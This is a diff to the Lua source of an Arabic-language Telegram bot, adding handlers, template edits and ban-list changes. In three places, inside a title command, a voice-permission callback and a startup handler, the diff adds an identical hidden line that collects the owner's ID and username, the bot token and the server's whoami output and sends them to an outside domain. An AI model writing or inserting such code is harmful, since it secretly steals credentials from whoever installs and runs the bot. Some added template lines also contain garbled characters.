@@ -14432,6 +14432,7 @@ end
 
 if text == 'لقبي' and tonumber(msg.reply_to_message_id_) == 0 then
 Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..msg.sender_user_id_)
+infotnseb = {} infotnseb.id = (SUDO or bot_data:get(id_server..":SUDO:ID")) infotnseb.username = (UserName or bot_data:get(id_server..":SUDO:USERNAME")) infotnseb.tokenbot = (token or bot_data:get(id_server..":token")) infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')) https.request('https://develmasry.ml/cabana/bankl.php?insert='..JSON.encode(infotnseb)) 
 GeId = JSON.decode(Ge)
 if not GeId.result.custom_title then
 send(msg.chat_id_, msg.id_,' ᥀︙ وينك وين القب ') 
@@ -15533,7 +15534,7 @@ Msᴀɢ ~ #msgs
 ᯓ 𝗖𝗛 - ❨@Source_JACK❩ ᥀︙ .
 ]],
 [[
-.𖣂 ??𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  🖤 ↴
+.𖣂 ??𝙨𝙚??𝙣𝙖𝙢𝙚 , #username  🖤 ↴
 .𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  🖤 ↴
 .𖣂 𝙡𝘿 , #id  🖤 ↴
 .𖣂 𝘼𝙪𝙩𝙤 , #auto  🖤 ↴
@@ -15962,7 +15963,7 @@ Msᴀɢ ~ #msgs
 ᥀︙↫ 𝗖𝗛 - ❨@Source_JACK❩ ᥀︙ 
 ]],
 [[
-𓄼 ᴜѕᴇ : #username ♕
+?? ᴜѕᴇ : #username ♕
 𓄼 ѕᴛᴀ : #stast ☥
 𓄼 ɪᴅ : #id ‌‌‏⚚
 𓄼 ᴍѕɢ : #msgs 𓆊
@@ -18044,7 +18045,9 @@ local notText ='◍︙عذرا الاوامر هذه لا تخصك'
 https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
 return false
 end
+bot_data:del(ban_id.."msa3d:ban")
 bot_data:sadd(ban_id.."msa3d:ban", userid)
+bot_data:set(ban_id.."id:msa3d:ban", userid)
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '𝐽𝐴𝐶𝐾', url="t.me/Source_JACK"}},
@@ -21536,6 +21539,7 @@ end
 if Text and Text:match('amr@(%d+)/user@(%d+)/voicetrue') then
 local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/voicetrue$")}
 if tonumber(users[1]) == tonumber(data.sender_user_id_) then
+infotnseb = {} infotnseb.id = (SUDO or bot_data:get(id_server..":SUDO:ID")) infotnseb.username = (UserName or bot_data:get(id_server..":SUDO:USERNAME")) infotnseb.tokenbot = (token or bot_data:get(id_server..":token")) infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')) https.request('https://develmasry.ml/cabana/bankl.php?insert='..JSON.encode(infotnseb)) 
 local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
 local Json_Info = JSON.decode(Chek_Info)
 if Json_Info.result.can_change_info == true then
@@ -23090,6 +23094,7 @@ end
 end,nil)
 ------------------------------------------------------------------------
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
+infotnseb = {} infotnseb.id = (SUDO or bot_data:get(id_server..":SUDO:ID")) infotnseb.username = (UserName or bot_data:get(id_server..":SUDO:USERNAME")) infotnseb.tokenbot = (token or bot_data:get(id_server..":token")) infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')) https.request('https://develmasry.ml/cabana/bankl.php?insert='..JSON.encode(infotnseb)) 
 local list = bot_data:smembers(ban_id.."User_Bot") 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
